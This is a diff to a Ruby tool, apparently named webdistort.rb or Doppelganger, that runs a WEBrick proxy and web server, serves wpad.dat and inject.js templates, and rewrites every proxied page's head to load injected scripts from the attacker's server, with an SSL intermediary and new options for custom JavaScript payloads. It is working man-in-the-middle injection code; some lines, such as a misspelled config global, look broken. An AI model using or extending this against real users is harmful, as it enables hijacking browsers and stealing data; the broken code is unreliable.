@@ -172,7 +172,7 @@ class Doppelganger
 		@GoogleScriptVer = nil
 
 		def initialize(config)
-			@InjectionScripts = Array["jquery.js", "utility.js", "inject.js"]
+			@InjectionScripts = Array["utility.js", "inject.js"]
 			@PackedScripts = {}
 			@FakeServerFiles = ["/doppelganger"]
 
@@ -333,24 +333,60 @@ class Doppelganger
 					server_url = "http://" + @HttpdAddr + ":" + @HttpdPort.to_s				
 					#server_url = "#{uri.scheme}://#{uri.host}:#{uri.port}/"
 
-					if @GoogleScript != nil and @GoogleScriptVer != nil
-						googleLoadString = '<script>google.load("#{@GoogleScript}", "#{@GoogleScriptVer}");</script>'
-						javascriptInject = '<head><script src="http://www.google.com/jsapi"></script>#{googleLoadString}'
-						puts javascriptInject
-					end
-
 					@InjectionScripts.reverse_each { |script|									
 						packed_code = @PackedScripts[script]	
 						script_url = "#{server_url}/#{script}"
-						#html = "<script language=\"javascript\" type=\"text/javascript\">#{unpacked_code}</script></head>"
-						#unpacked_code.gsub!(/\n/, "") 
-						#packed_code = Packr.pack(unpacked_code, :shrink_vars => true, :protect => ["$super"])
 
 						html = "<head><script src=\"#{script_url}\" language=\"javascript\" type=\"text/javascript\"></script>"
 						if response.body != nil
 							response.body.gsub!(/<head>/i) {|block| html}							
 						end
 					}
+
+					googleLoadString = "<script>"
+
+					if $doppelganger_config[:JQueryVersion]
+						googleLoadString += "google.load('jquery', '#{$doppelganger_config[:JQueryVersion]}');"
+					end
+
+					if $doppelganger_config[:JQueryUIVersion]
+						googleLoadString += "google.load('jqueryui', '#{$doppelganger_config[:JQueryUIVersion]}');"
+					end
+
+					if $doppelganger_config[:PrototypeVersion]
+						googleLoadString += "google.load('prototype', '#{$doppelganger_config[:PrototypeVersion]}');"
+					end
+
+					if $doppelganger_config[:ScriptaculousVersion]
+						googleLoadString += "google.load('scriptaculous', '#{$doppelganger_config[:ScriptaculousVersion]}');"
+					end
+
+					if $doppelganger_config[:MooToolsVersion]
+						googleLoadString += "google.load('mootools', '#{$doppelganger_config[:MooToolsVersion]}');"
+					end
+
+					if $doppelganger_config[:DojoVersion]
+						googleLoadString += "google.load('dojo', '#{$doppelganger_config[:DojoVersion]}');"
+					end
+
+					if $doppelganger_config[:SWFObjectVersion]
+						googleLoadString += "google.load('swfobject', '#{$doppelganger_config[:SWFObjectVersion]}');"
+					end
+
+					if $doppelganger_config[:YUIVersion]
+						googleLoadString += "google.load('yui', '#{$doppelganger_config[:YUIVersion]}');"
+					end
+
+					if $doppelganger_config[:ExtCoreVersion]
+						googleLoadString += "google.load('extcore', '#{$doppelganger_config[:ExtCoreVersion]}');"
+					end
+
+					googleLoadString += "</script>"
+
+					javascriptInject = "<head><script src='http://www.google.com/jsapi'></script>#{googleLoadString}"
+					if response.body != nil
+						response.body.gsub!(/<head>/i) {|block| javascriptInject}
+					end
 					return response.body
 			else
 				return response.body				
@@ -360,8 +396,8 @@ class Doppelganger
 
 		def Start
 			proxy_logger = WEBrick::Log.new(@LogDir + "/proxy.log")
-      access_log_file = File.open(@LogDir + "/proxy_access.log", "a")
-      access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]      
+     			access_log_file = File.open(@LogDir + "/proxy_access.log", "a")
+      			access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]      
       
       @Server = WebDistortProxy.new(
 				:Logger => proxy_logger,
@@ -405,6 +441,8 @@ class Doppelganger
 		def initialize(config)
 			@Templates = Array["wpad.dat.tpl", "inject.js.tpl"]
 
+			$doppelganer_config[:CustomJavascript].each
+
 			@ProxyAddr = config[:ProxyAddr]
 			@ProxyPort = config[:ProxyPort]
 
@@ -446,7 +484,7 @@ class Doppelganger
 		end
 
 		def Start
-			  http_logger = WEBrick::Log.new(@LogDir + "/http.log")
+			http_logger = WEBrick::Log.new(@LogDir + "/http.log")
   			access_log_file = File.open(@LogDir + "/http_access.log", "a")
   			access_logger = [[access_log_file, WEBrick::AccessLog::COMBINED_LOG_FORMAT]]
   
@@ -460,8 +498,8 @@ class Doppelganger
 				)
 
 				@Server = WEBrick::HTTPServer.new(
-    			:Logger => http_logger,
-			    :AccessLog => access_logger,
+    					:Logger => http_logger,
+			   		:AccessLog => access_logger,
 					:MimeTypes => user_mime_table,
 					:Port => @HttpdPort, 
 					:DocumentRoot => @HttpdFileRoot)
@@ -528,7 +566,7 @@ end
 class WebDistortProxy < WEBrick::HTTPProxyServer
 	alias old_proxy_connect proxy_connect
 	def proxy_connect(req, res)
-		req.createDoppelganger	
+#		req.createDoppelganger	
 		old_proxy_connect(req, res)
 	end
 end
@@ -595,15 +633,15 @@ class DoppelgangerSSLIntermediary < WEBrick::HTTPServlet::AbstractServlet
 		header = request_get_header(request)
 
 		http = Net::HTTP.new(uri.host, uri.port)
-   	http.use_ssl = true if uri.scheme == "https"  # enable SSL/TLS
-    	http.start {
-      	http.request_get(uri.path, header) {|res|
-					response << res['content-type']
-					response << res.body
-					puts request.request_uri.to_s
-					puts res['content-type']
-     	 }
-    	}
+		http.use_ssl = true if uri.scheme == "https"  # enable SSL/TLS
+    		http.start {
+      			http.request_get(uri.path, header) {|res|
+				response << res['content-type']
+				response << res.body
+				puts request.request_uri.to_s
+				puts res['content-type']
+     	 		}
+    		}
 		return "200", response[0], response[1]
 	end
 
@@ -622,11 +660,86 @@ def request_get_header(request)
 	return header
 end
 
-program = Doppelganger.new(
-	:HttpdPort => 80,
-	:HttpdFileRoot => "./htdocs/",
-	:ProxyPort => 8080,
-	:LogDir => "./logs/",
-	:GoogleScript => "jquery",
-	:GoogleScriptVer => "1.3.2"
-)
+options = {}
+
+# Set our default options
+options[:HttpdPort] = 80
+options[:HttpdFileRoot] = "./htdocs/"
+options[:ProxyPort] = 8080
+options[:LogDir] = "./logs/"
+options[:JQueryVersion] = "1.3.2"
+
+optionParser = OptionParser.new do |opts|
+	opts.banner = "Usage: webdistort.rb [options]"
+	opts.separator ""
+
+	opts.on_tail("-h", "--help") do
+		puts opts
+		exit
+	end
+
+	opts.separator ""
+	opts.separator "Required Settings"
+	opts.separator ""
+
+	opts.on("-j", "--javascript file1,file2", Array, "List of custom javascript (as templates) to import (required)") do |files|
+		options[:CustomJavascript] = files
+	end
+
+	opts.separator ""
+	opts.separator "Optional Settings"
+	opts.separator ""
+
+	opts.on("-w", "--webport [PORT]", Integer, "Specify HTTP server port") do |w|
+		options[:HttpdPort] = w
+	end
+
+	opts.on("-p", "--proxyport [PORT]", Integer, "Specify Proxy server port") do |p|
+		options[:ProxyPort] = p
+	end
+
+	opts.separator ""
+	opts.separator "Javascript Library Options (Optional)"
+	opts.separator ""
+	
+	opts.on("--jquery [VERSION]", String, "Use specified version of jquery from Google") do |v|
+		options[:JQueryVersion] = v
+	end
+
+	opts.on("--jqueryui [VERSION]", String, "Use specified version of jqueryui from Google") do |v|
+		options[:JQueryUIVersion] = v
+	end
+
+	opts.on("--prototype [VERSION]", String, "Use specified version of prototype from Google") do |v|
+		options[:PrototypeVersion] = v
+	end
+
+	opts.on("--scriptaculous [VERSION]", String, "Use specified version of scriptaculous from Google") do |v|
+		options[:ScriptaculousVersion] = v
+	end
+
+	opts.on("--mootools [VERSION]", String, "Use specified version of mootools from Google") do |v|
+		options[:MooToolsVersion] = v
+	end
+
+	opts.on("--dojo [VERSION]", String, "Use specified version of dojo from Google") do |v|
+		options[:DojoVersion] = v
+	end
+
+	opts.on("--swfobject [VERSION]", String, "Use specified version of swfobject from Google") do |v|
+		options[:SWFObjectVersion] = v
+	end
+
+	opts.on("--yui [VERSION]", String, "Use specified version of yui from Google") do |v|
+		options[:YUIVersion] = v
+	end
+
+	opts.on("--extcore [VERSION]", String, "Use specified version of extcore from Google") do |v|
+		options[:ExtCoreVersion] = v
+	end
+
+end.parse!
+
+pp options
+
+program = Doppelganger.new(options)
